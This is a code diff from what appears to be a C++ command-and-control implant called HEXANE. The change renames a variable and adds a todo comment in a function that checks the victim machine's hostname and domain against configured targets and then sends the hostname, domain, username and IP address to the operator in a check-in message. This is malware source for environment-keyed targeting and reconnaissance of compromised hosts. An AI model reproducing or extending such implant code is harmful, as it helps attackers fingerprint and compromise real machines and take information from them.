@@ -90,15 +90,16 @@ namespace Opsec {
     }
 
     VOID SeCheckEnvironment() {
+        // todo: add other information to the checkin message
         HEXANE
 
-        _stream *entry              = Stream::CreateStreamWithHeaders(TypeCheckin);
-        IP_ADAPTER_INFO adapter     = { };
+        _stream *out = Stream::CreateStreamWithHeaders(TypeCheckin);
+        IP_ADAPTER_INFO adapter = { };
 
-        char buffer[MAX_PATH]       = { };
-        unsigned long length        = MAX_PATH;
+        char buffer[MAX_PATH] = { };
+        unsigned long length = MAX_PATH;
 
-        if (!entry) {
+        if (!out) {
             return_defer(ERROR_NO_DATA);
         }
 
@@ -106,10 +107,10 @@ namespace Opsec {
             if (x_strncmp(Ctx->Config.Hostname, buffer, x_strlen(Ctx->Config.Hostname)) != 0) {
                 return_defer(ERROR_BAD_ENVIRONMENT);
             }
-            Stream::PackString(entry, buffer);
+            Stream::PackString(out, buffer);
 
         } else {
-            Stream::PackDword(entry, 0);
+            Stream::PackDword(out, 0);
         }
 
         x_memset(buffer, 0, MAX_PATH);
@@ -120,10 +121,10 @@ namespace Opsec {
                 if (x_strncmp(Ctx->Transport.Domain, buffer, x_strlen(Ctx->Transport.Domain)) != 0) {
                     return_defer(ERROR_BAD_ENVIRONMENT);
                 }
-                Stream::PackString(entry, buffer);
+                Stream::PackString(out, buffer);
 
             } else {
-                Stream::PackDword(entry, 0);
+                Stream::PackDword(out, 0);
             }
         }
 
@@ -131,24 +132,24 @@ namespace Opsec {
         length = MAX_PATH;
 
         if (Ctx->win32.GetUserNameA(R_CAST(LPSTR, buffer), &length)) {
-            Stream::PackString(entry, buffer);
+            Stream::PackString(out, buffer);
         } else {
-            Stream::PackDword(entry, 0);
+            Stream::PackDword(out, 0);
         }
 
         x_memset(buffer, 0, length);
         length = sizeof(IP_ADAPTER_INFO);
 
         if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
-            Stream::PackString(entry, adapter.IpAddressList.IpAddress.String);
+            Stream::PackString(out, adapter.IpAddressList.IpAddress.String);
         } else {
-            Stream::PackDword(entry, 0);
+            Stream::PackDword(out, 0);
         }
 
         x_memset(&adapter, 0, sizeof(IP_ADAPTER_INFO));
 
     defer:
-        Dispatcher::OutboundQueue(entry);
+        Dispatcher::OutboundQueue(out);
     }
 
     BOOL SeImageCheckArch(const _executable *const image) {
